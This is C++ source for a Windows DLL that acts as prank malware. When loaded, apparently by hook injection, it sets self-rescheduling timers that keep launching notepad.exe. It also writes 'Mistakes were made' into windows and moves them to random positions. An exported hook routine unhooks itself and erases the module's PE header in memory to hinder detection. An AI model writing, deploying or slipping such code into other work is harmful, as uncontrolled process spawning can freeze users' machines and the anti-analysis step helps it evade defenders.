// dllmain.cpp : Defines the entry point for the DLL application.
#include "framework.h"
#include "Timer.h"
#include <cstdint>

struct handle_data {
    unsigned long process_id;
    HWND window_handle;
};

BOOL is_main_window(HWND handle)
{
    return GetWindow(handle, GW_OWNER) == (HWND)0 && IsWindowVisible(handle);
}

BOOL CALLBACK enum_windows_callback(HWND handle, LPARAM lParam)
{
    handle_data& data = *(handle_data*)lParam;
    unsigned long process_id = 0;
    GetWindowThreadProcessId(handle, &process_id);
    if (data.process_id != process_id || !is_main_window(handle))
        return TRUE;
    data.window_handle = handle;
    return FALSE;
}

HWND find_main_window(unsigned long process_id)
{
    handle_data data;
    data.process_id = process_id;
    data.window_handle = 0;
    EnumWindows(enum_windows_callback, (LPARAM)&data);
    return data.window_handle;
}

void startIt()
{
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, NULL, NULL, si, pi);
}

void Kekolo(int count, bool replicate)
{
    srand((unsigned)time(NULL) * GetCurrentProcessId());
    auto hWnd = find_main_window(GetCurrentProcessId());
    if (hWnd)
    {
        auto edit = FindWindowEx(hWnd, NULL, "EDIT", NULL);
        SendMessage(edit, EM_REPLACESEL, TRUE, (LPARAM)"Mistakes were made\n");
        SetWindowTextA(hWnd, "Mistakes were made\n");
        MoveWindow(hWnd, rand() % 720, rand() % 720, 420, 420, TRUE);
    }
    for (int i = 0; i < count; i++)
    {
        startIt();
    }
    if (replicate)
    {
        later fork420(215, true, &Kekolo, count, true);
    }
}

extern "C" __declspec(dllexport) LRESULT Fork(int code, WPARAM wParam, LPARAM lParam)
{
    if ((uint64_t)wParam == 0xDEADBEEF)
    {
        UnhookWindowsHookEx((HHOOK)lParam);
        memset((void*)GetModuleHandle(NULL), 0, 0x1000); // erase the PE header
        return CallNextHookEx(NULL, WM_NULL, 0, 0);
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (true) //lol wtf msvc
        {
            later fork420(1000, true, &Kekolo, 0, true);
            later fork69(5000, true, &Kekolo, 1, false);
            later fork1337(10000, true, &Kekolo, 1, false);
        }
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        if (lpReserved) 
        {
            Kekolo(2, false);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        break;
    }
    return TRUE;
}

